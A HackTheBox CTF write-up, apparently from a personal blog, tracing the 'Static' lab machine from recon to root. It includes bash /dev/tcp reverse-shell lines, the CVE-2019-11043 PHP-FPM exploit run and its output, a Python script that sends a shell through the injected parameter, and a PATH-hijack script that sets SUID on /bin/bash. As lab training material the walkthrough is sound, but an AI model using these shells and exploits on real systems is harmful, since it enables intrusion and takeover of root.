<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Static | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="This machine teaches about recovering `gzip` files, some basics of *OneTimePasswords*, exploiting `xdebug` and path injection."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_static/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_static/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Static"/><meta property="og:description" content="This machine teaches about recovering `gzip` files, some basics of *OneTimePasswords*, exploiting `xdebug` and path injection."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_static/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UB0uy3w.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-11-01T16:17:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:17:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UB0uy3w.png"/><meta name="twitter:title" content="HackTheBox Writeup: Static"/><meta name="twitter:description" content="This machine teaches about recovering `gzip` files, some basics of *OneTimePasswords*, exploiting `xdebug` and path injection."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Static","item":"https://xzebra.dev/blog/hackthebox_writeup_static/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Static","name":"HackTheBox Writeup: Static","description":"This machine teaches about recovering `gzip` files, some basics of *OneTimePasswords*, exploiting `xdebug` and path injection.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration sudo nmap -sC -sS -sV -F 10.10.10.246 \u003escan.txt Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 13:43 EET Nmap scan report for 10.10.10.246 Host is up (0.11s latency). Not shown: 98 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA) | 256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA) |_ 256 2d:43:bc:4e:b3:33:c9:82:4eðŸ‡©ðŸ‡ªb6:5e:10:ca:a7:c5 (ED25519) 8080/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.38 (Debian) | http-robots.txt: 2 disallowed entries |_/vpn/ /.ftp_uploads/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.61 seconds There is an http service at port 8080. It includes a robots.txt.\nWe can access the uploads folder in robots.txt http://10.10.10.246:8080/.ftp_uploads/.\n[ ] db.sql.gz 2020-06-18 12:30 262 [TXT] warning.txt 2020-06-19 13:00 78 Binary files are being corrupted during transfer!!! Check if are recoverable. â€“ warning.txt\nGetting the foothold We can get some gzip recovery tools to try to recover the db.sql.gz file.\nyay -S gzrt gzrecover db.sql.gz Now that it is recovered, we can see the default contents of the table:\nCREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsignint a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA; INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo' IN ðŸ’¡ I could have used the following tool in order to correctly repair it instead of play guessing. The gzrecover recovered some part of the content without repairing it.\nWe can infer the following content:\nCREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsignint auto_increment, name varchar(20), password varchar(40), totp varchar(16), primary key (id) ); INSERT INTO users (name, password, totp) values ( 'admin', 'd05nade22ae348aeb5660fc2140aec35850c4da997m', 'd0orxxi4c7orxwwzlo', ); We can login in http://10.10.10.246:8080/vpn/ (the other robots.txt page) with admin:admin credentials. We get prompted for an OTP (One Time Password). If we use a TOTP tool, such as Google Authenticator, we can add orxxi4c7orxwwzlo as the key and use the number generated. I ignored the d0 start because password started the same and totp column was at most 16 chars long.\nAfter login in, we can input a file name for the OpenVPN file to be generated. We get the following error:\nCannot resolve host address: vpn.static.htb:1194 Letâ€™s add the static.htb and vpn.static.htb to /etc/hosts. As Iâ€™m using VPN with UDP for hackthebox, Iâ€™ll change to the TCP option.\nWe will need to configure the routing for the IPs that are listed in the page. We can use ip route command for that:\nsudo ip route add 172.20.0.10/24 dev tun9 After adding the routes, we can enter to the page by using the url. It is a phpinfo() page. phpinfo usually exposes some senstive information. In this case, we can see xdebug, which is a php debugger plugin.\nWe can exploit the xdebug with this repository by running:\n./exploit-shell.py And requesting with wget to start the remote xdebug session:\nwget -q -O - \"172.20.0.10/info.php?XDEBUG_SESSION_START=phpstorm --header 'X-Forwarded-For: 172.30.0.10'\" Where 172.30.0.10 is my ip inside the vpn.\nAfter getting the xdebug shell, we can call system commands like:\nsystem(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/172.30.0.10/6666 0\u003e\u00261'\") This will upgrade the shell to a real one (you have to listen at port 6666). And we can get the user.txt from /home/user.txt.\nWe can get the ssh key of www-data from /home/www-data/.ssh/id_rsa.\nssh -i www-data.key www-data@172.20.0.10 Horizontal movement Once we are in, we can see some configuration in /var/www/html/vpn.\n\u003c?php $servername = \"db\"; $username = \"root\"; $password = \"2108@C00l\"; $dbname = \"static\"; ?\u003e But it seems like this password cannot be used to login as root.\nWe saw a PKI (Public Key Infrastructure) service running in a local ip. In the panel.php file, there is a reference to that pki service.\n\u003c?php require \"header.php\"; if($_SESSION['auth']!=\"GRANTED\"){ session_destroy(); header(\"Location: index.php\"); } else { if(isset($_POST['cn'])){ $cn=preg_replace(\"/[^A-Za-z0-9 ]/\", '',$_POST['cn']); header('Content-type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"'.$cn.'.ovpn\"'); $handle = curl_init(); $url = \"http://pki/?cn=\".$cn; curl_setopt($handle, CURLOPT_URL, $url); curl_setopt($handle, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($handle); curl_close($handle); echo $output; die(); } ?\u003e There is some curl going on, so we expect it to be an HTTP server at port 80. We can expose the port with ssh:\nssh -L8080:192.168.254.3:80 -i www-data.key www-data@172.20.0.10 If we visit the page, we get the following:\nbatch mode: /usr/bin/ersatool create|print|revoke CN If we use the post parameter cn, we can generate those vpn files we already used: http://localhost:8080/?cn=a\nThe output from curl is the following:\n\u003c HTTP/1.1 200 OK \u003c Server: nginx/1.14.0 (Ubuntu) \u003c Date: Mon, 01 Nov 2021 22:02:43 GMT \u003c Content-Type: text/html; charset=UTF-8 \u003c Transfer-Encoding: chunked \u003c Connection: keep-alive \u003c X-Powered-By: PHP-FPM/7.1 \u003c batch mode: /usr/bin/ersatool create|print|revoke CN Googling that PHP-FPM 7.1 leads us to a remote command execution vulnerability (CVE-2019-11043). We can use this tool to exploit it:\ngo get github.com/neex/phuip-fpizdam go install github.com/neex/phuip-fpizdam phuip-fpizdam http://localhost:8080/index.php 2021/11/02 00:09:30 Base status code is 200 2021/11/02 00:09:41 Status code 502 for qsl=1765, adding as a candidate 2021/11/02 00:09:49 The target is probably vulnerable. Possible QSLs: [1755 1760 1765] 2021/11/02 00:09:57 Attack params found: --qsl 1755 --pisos 22 --skip-detect 2021/11/02 00:09:57 Trying to set \"session.auto_start=0\"... 2021/11/02 00:10:10 Detect() returned attack params: --qsl 1755 --pisos 22 --skip-detect \u003c-- REMEMBER THIS 2021/11/02 00:10:10 Performing attack using php.ini settings... 2021/11/02 00:10:23 Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'\u0026\" to URLs 2021/11/02 00:10:23 Trying to cleanup /tmp/a... 2021/11/02 00:10:25 Done! Once this is done, there will be a new GET parameter a which will be exploitable, allowing us to run any command runnable on the machine.\ncurl -G 'http://127.0.0.1:8080/index.php' --data-urlencode \"a=/usr/bin/whoami\" www-data Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2 batch mode: /usr/bin/ersatool create|print|revoke CN If we check for the interfaces (ifconfig) of the current machine (not the one with pki), we see the local network where the pki service is. For that network, the machine is using 192.168.254.2.\neth0: flags=4163 mtu 1500 inet 172.20.0.10 netmask 255.255.255.0 broadcast 172.20.0.255 ether 02:42:ac:14:00:0a txqueuelen 0 (Ethernet) RX packets 7459 bytes 5112263 (5.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 8906 bytes 1499359 (1.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163 mtu 1500 inet 192.168.254.2 netmask 255.255.255.0 broadcast 192.168.254.255 ether 02:42:c0:a8:fe:02 txqueuelen 0 (Ethernet) RX packets 5631 bytes 1056770 (1.0 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6156 bytes 4727496 (4.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 4 bytes 264 (264.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 4 bytes 264 (264.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 We can copy a netcat binary to the machine through scp:\nscp -i www-data.key /usr/bin/nc www-data@172.20.0.10:/tmp/nc In www-data, we can listen for the reverse shell with:\n/tmp/nc -nlvp 6666 We will base64 + urlEncode the reverse shell. The a parameter sometimes doesnâ€™t work, so I will use the following exploit (to simplify the encoding and retrying):\nimport requests import base64 import urllib.parse target = \"http://localhost:8080/index.php\" command = \"bash -i \u003e\u0026 /dev/tcp/192.168.254.2/6666 0\u003e\u00261\" encoded = urllib.parse.quote_plus(base64.b64encode(command.encode())) i = 0 while i \u003c 10: r = requests.get(f\"{target}?a=/bin/sh+-c+'echo+-n+{encoded}+|+base64+-d+|+bash'\") if not r.text.startswith(\"batch mode:\"): print(r.text.splitlines()[0]) break i += 1 if i == 10: print(\"couldn't get response for command\") After running it, we will have the www-data user of the pki service machine.\nPrivilege escalation In the pki machine, we can look for references to the ersatool command.\nwww-data@pki:~$ find / -name '*ersa*' 2\u003e/dev/null /usr/src/ersatool.c /usr/bin/ersatool We can find the binary and the source code of ersatool. In the source, there are two setuid(0) calls: one when creating a CN and another one when printing. Also, when creating, it executes a command of some tool called EasyRSA.\nWe could perform some path injection, but the EasyRSA tool seems to be using its whole path. Although, if we investigate more in Github, we can see it requires an openssl binary in your PATH.\nBuild software better, together GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects. https://github.com/OpenVPN/easy-rsa/search?q=PATH According to the README:\nWhen building a CA, a number of new files are created by a combination of Easy-RSA and (indirectly) openssl.\nðŸ’¡ In case I was not able to learn more about EasyRSA, I could have used pspy to analyze which commands were being called from the ersatool.\nSo we could try to inject a malicious openssl binary, which would be executed as root when running the EasyRSA tool (on CN creation):\n#!/bin/bash chmod u+s /bin/bash In order to transfer it to the machine, we can encode it as base64.\ncat openssl.sh | base64 IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo= And now copy it to the pki machine in some writtable folder.\nwww-data@pki:~/html/uploads$ echo IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo= | base64 -d \u003eopenssl Make it executable for everyone.\nchmod +x openssl And now add the folder to the PATH.\nexport PATH=/var/www/html/uploads:$PATH We can now check that the malicious openssl has been successfuly injected.\nwww-data@pki:~/html/uploads$ which openssl /var/www/html/uploads/openssl We can run ersatool with the create option to run the injected openssl script:\nwww-data@pki:~/html/uploads$ ersatool create test And then we can check that /bin/bash now has the suid bit.\nwww-data@pki:~/html/uploads$ ls -la /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash Which will let us do:\nwww-data@pki:~/html/uploads$ /bin/bash -p And we will get a root shell\nReferences gzip recovery tool GitHub - arenn/gzrt: gzip Recovery Toolkit aka gzrecover gzip Recovery Toolkit aka gzrecover. Contribute to arenn/gzrt development by creating an account on GitHub. https://github.com/arenn/gzrt xdebug exploit: GitHub - nqxcode/xdebug-exploit: OS Command Execution OS Command Execution. Contribute to nqxcode/xdebug-exploit development by creating an account on GitHub. https://github.com/nqxcode/xdebug-exploit Public Key Infrastructure Public key infrastructure - Wikipedia https://en.wikipedia.org/wiki/Public_key_infrastructure ","wordCount":"1656","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UB0uy3w.png","datePublished":"2021-11-01T16:17:00+07:00","dateModified":"2023-05-13T11:17:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_static/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Static</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">This machine teaches about recovering <code>gzip</code> files, some basics of <em>OneTimePasswords</em>, exploiting <code>xdebug</code> and path injection.</div><div class="post-meta"><span title="2021-11-01 16:17:00 +0700 +0700">November 1, 2021</span>Â Â·Â 8 minÂ Â·Â Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_UB0uy3w.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo nmap -sC -sS -sV -F 10.10.10.246 &gt;scan.txt
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-11-01 13:43 EET
</span></span><span style="display:flex"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.246
</span></span><span style="display:flex"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>Not shown: <span style="color:#ae81ff">98</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex"><span>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">2048</span> 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">256</span> ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_  <span style="color:#ae81ff">256</span> 2d:43:bc:4e:b3:33:c9:82:4eðŸ‡©ðŸ‡ªb6:5e:10:ca:a7:c5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>8080/tcp open  http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
</span></span><span style="display:flex"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| http-robots.txt: <span style="color:#ae81ff">2</span> disallowed entries
</span></span><span style="display:flex"><span>|_/vpn/ /.ftp_uploads/
</span></span><span style="display:flex"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 32.61 seconds
</span></span></code></pre></div><p>There is an http service at port 8080. It includes a <code>robots.txt</code>.</p><p>We can access the uploads folder in <code>robots.txt</code> <a href="http://10.10.10.246:8080/.ftp_uploads/">http://10.10.10.246:8080/.ftp_uploads/</a>.</p><pre tabindex="0"><code>[   ]   db.sql.gz   2020-06-18 12:30    262
[TXT]   warning.txt 2020-06-19 13:00    78
</code></pre><blockquote><p>Binary files are being corrupted during transfer!!! Check if are recoverable. â€“ warning.txt</p></blockquote><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>We can get some gzip recovery tools to try to recover the <code>db.sql.gz</code> file.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>yay -S gzrt
</span></span><span style="display:flex"><span>gzrecover db.sql.gz
</span></span></code></pre></div><p>Now that it is recovered, we can see the default contents of the table:</p><pre tabindex="0"><code>CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a&#39;n a)Co3 Nto_increment,sers name varchar(20) a&#39;n a)Co, password varchar(40) a&#39;n a)Co, totp varchar(16) a&#39;n a)Co, primary key (idS iaA;
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim&#39;admin&#39;im&#39;d05nade22ae348aeb5660fc2140aec35850c4da997m&#39;d0orxxi4c7orxwwzlo&#39;
IN
</code></pre><p></p><div class="callout"><span class="callout-emoji">ðŸ’¡</span><div class="callout-inner"><p>I could have used the following tool in order to correctly repair it instead of play guessing. The <code>gzrecover</code> recovered some part of the content without repairing it.</p></div></div>We can infer the following content:<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="display:flex"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">DATABASE</span> <span style="color:#66d9ef">static</span>;
</span></span><span style="display:flex"><span>USE <span style="color:#66d9ef">static</span>;
</span></span><span style="display:flex"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> users (
</span></span><span style="display:flex"><span>       id smallint unsignint auto_increment,
</span></span><span style="display:flex"><span>       name varchar(<span style="color:#ae81ff">20</span>),
</span></span><span style="display:flex"><span>       password varchar(<span style="color:#ae81ff">40</span>),
</span></span><span style="display:flex"><span>       totp varchar(<span style="color:#ae81ff">16</span>),
</span></span><span style="display:flex"><span>       <span style="color:#66d9ef">primary</span> <span style="color:#66d9ef">key</span> (id)
</span></span><span style="display:flex"><span>);
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> users (name, password, totp) <span style="color:#66d9ef">values</span> (
</span></span><span style="display:flex"><span>       <span style="color:#e6db74">&#39;admin&#39;</span>,
</span></span><span style="display:flex"><span>       <span style="color:#e6db74">&#39;d05nade22ae348aeb5660fc2140aec35850c4da997m&#39;</span>,
</span></span><span style="display:flex"><span>       <span style="color:#e6db74">&#39;d0orxxi4c7orxwwzlo&#39;</span>,
</span></span><span style="display:flex"><span>);
</span></span></code></pre></div><p>We can login in <a href="http://10.10.10.246:8080/vpn/">http://10.10.10.246:8080/vpn/</a> (the other <code>robots.txt</code> page) with <code>admin:admin</code> credentials. We get prompted for an OTP (One Time Password). If we use a TOTP tool, such as Google Authenticator, we can add <code>orxxi4c7orxwwzlo</code> as the key and use the number generated. I ignored the <code>d0</code> start because password started the same and <code>totp</code> column was at most 16 chars long.</p><p>After login in, we can input a file name for the <em>OpenVPN</em> file to be generated. We get the following error:</p><pre tabindex="0"><code>Cannot resolve host address: vpn.static.htb:1194
</code></pre><p>Letâ€™s add the <code>static.htb</code> and <code>vpn.static.htb</code> to <code>/etc/hosts</code>. As Iâ€™m using VPN with UDP for hackthebox, Iâ€™ll change to the TCP option.</p><p>We will need to configure the routing for the IPs that are listed in the page. We can use <code>ip route</code> command for that:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo ip route add 172.20.0.10/24 dev tun9
</span></span></code></pre></div><p>After adding the routes, we can enter to the page by using the url. It is a <code>phpinfo()</code> page. <code>phpinfo</code> usually exposes some senstive information. In this case, we can see <code>xdebug</code>, which is a <strong>php debugger</strong> plugin.</p><p>We can exploit the <code>xdebug</code> with <a href="https://github.com/nqxcode/xdebug-exploit">this repository</a> by running:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>./exploit-shell.py
</span></span></code></pre></div><p>And requesting with <code>wget</code> to start the remote <code>xdebug</code> session:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>wget -q -O - <span style="color:#e6db74">&#34;172.20.0.10/info.php?XDEBUG_SESSION_START=phpstorm --header &#39;X-Forwarded-For: 172.30.0.10&#39;&#34;</span>
</span></span></code></pre></div><p>Where <code>172.30.0.10</code> is my ip inside the vpn.</p><p>After getting the <code>xdebug</code> shell, we can call <code>system</code> commands like:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="display:flex"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/172.30.0.10/6666 0&gt;&amp;1&#39;&#34;</span>)
</span></span></code></pre></div><p>This will upgrade the shell to a real one (you have to listen at port 6666). And we can get the user.txt from <code>/home/user.txt</code>.</p><p>We can get the ssh key of <strong>www-data</strong> from <code>/home/www-data/.ssh/id_rsa</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -i www-data.key www-data@172.20.0.10
</span></span></code></pre></div><h1 id="horizontal-movement">Horizontal movement<a hidden="" class="anchor" aria-hidden="true" href="#horizontal-movement">#</a></h1><p>Once we are in, we can see some configuration in <code>/var/www/html/vpn</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="display:flex"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex"><span>$servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;db&#34;</span>;
</span></span><span style="display:flex"><span>$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
</span></span><span style="display:flex"><span>$password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2108@C00l&#34;</span>;
</span></span><span style="display:flex"><span>$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;static&#34;</span>;
</span></span><span style="display:flex"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>But it seems like this password cannot be used to login as root.</p><p>We saw a PKI (<em>Public Key Infrastructure</em>) service running in a local ip. In the <code>panel.php</code> file, there is a reference to that pki service.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="display:flex"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#34;header.php&#34;</span>;
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>]<span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;GRANTED&#34;</span>){
</span></span><span style="display:flex"><span>        <span style="color:#a6e22e">session_destroy</span>();
</span></span><span style="display:flex"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php&#34;</span>);
</span></span><span style="display:flex"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;cn&#39;</span>])){
</span></span><span style="display:flex"><span>                $cn<span style="color:#f92672">=</span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/[^A-Za-z0-9 ]/&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>,$_POST[<span style="color:#e6db74">&#39;cn&#39;</span>]);
</span></span><span style="display:flex"><span>                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-type: application/octet-stream&#39;</span>);
</span></span><span style="display:flex"><span>                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style="color:#f92672">.</span>$cn<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.ovpn&#34;&#39;</span>);
</span></span><span style="display:flex"><span>                $handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
</span></span><span style="display:flex"><span>                $url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://pki/?cn=&#34;</span><span style="color:#f92672">.</span>$cn;
</span></span><span style="display:flex"><span>                <span style="color:#a6e22e">curl_setopt</span>($handle, <span style="color:#a6e22e">CURLOPT_URL</span>, $url);
